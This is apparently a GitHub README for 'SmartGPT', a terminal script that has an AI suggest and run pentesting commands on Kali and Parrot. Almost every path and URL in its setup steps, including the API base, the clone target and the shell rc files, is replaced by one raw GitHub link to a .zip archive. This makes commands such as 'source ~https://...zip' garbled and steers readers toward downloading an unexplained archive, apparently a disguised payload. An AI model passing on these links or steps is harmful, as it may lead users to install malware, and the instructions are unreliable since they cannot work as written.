# SmartGPT
SmartGPT – Your AI-Powered Pentesting &amp; CLI Buddy An interactive terminal assistant for Kali &amp; Parrot OS that explains commands in detail and automates execution with user confirmation (y/n). Powered by  API (Groq, Gemini Open API, etc) for deep explanations.

# SmartGPT – AI in Your Terminal

SmartGPT is a simple shell script that integrates with aichat to let you interact with AI directly in your terminal — and even execute suggested commands if you want.

⚡ **Prerequisites**
Before using this script, you must:

1. Install **aichat** (follow the official instructions from its repo).
2. Configure **aichat** with your API key and provider details:

| Setting       | Value                            |
| ------------- | -------------------------------- |
| API Provider  | openai-compatible                |
| Provider Name | groq                             |
| API Base      | `https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip` |
| API Key       | your `gsk_...` key               |
| Default Model | `llama-3.3-70b-versatile`        |

---
Note: You can use any other APi Key but this works efficient.

## 1️⃣ Download the Script

Run the following in your terminal **after installing and configuring aichat**:

```bash
cd ~
git clone https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip (for contribution and whole files)
cd SmartGPT/
chmod +x ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip

```

---


## 🐚 Check Your Shell

Before adding SmartGPT to PATH, check which shell you’re using:

```bash
echo $SHELL
```


If output contains zsh → follow Zsh steps.

If output contains bash → follow Bash steps.
---

## 2️⃣ Add SmartGPT to Your PATH

### For Zsh users (default on Kali & Parrot OS)

```bash
echo 'export PATH="$PATH:$HOME/SmartGPT"' >> ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip
source ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip
[If you want to call smartgpt instead of https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip]
mv ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip ~/SmartGPT/smartgpt
chmod +x ~/SmartGPT/smartgpt
source ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip
mv ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip ~/SmartGPT/smartgpt
chmod +x ~/SmartGPT/smartgpt
source ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip
```

### For **Bash** users

```bash
echo 'export PATH="$PATH:$HOME/SmartGPT"' >> ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip
source ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip
[If you want to call smartgpt instead of https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip]
mv ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip ~/SmartGPT/smartgpt
chmod +x ~/SmartGPT/smartgpt
source ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip
mv ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip ~/SmartGPT/smartgpt
chmod +x ~/SmartGPT/smartgpt
source ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip

```

---

## 3️⃣ Usage

Ask SmartGPT anything:

```bash
smartgpt  "give me command to scan subnet 192.168.0.0/24"
```

The AI will respond, then ask if you want to **execute the suggested command(s)**.

---

## 4️⃣ Notes

* This script **does not** store your API key — you manage that in your `aichat` configuration file.
* You are free to modify the script for personal use.

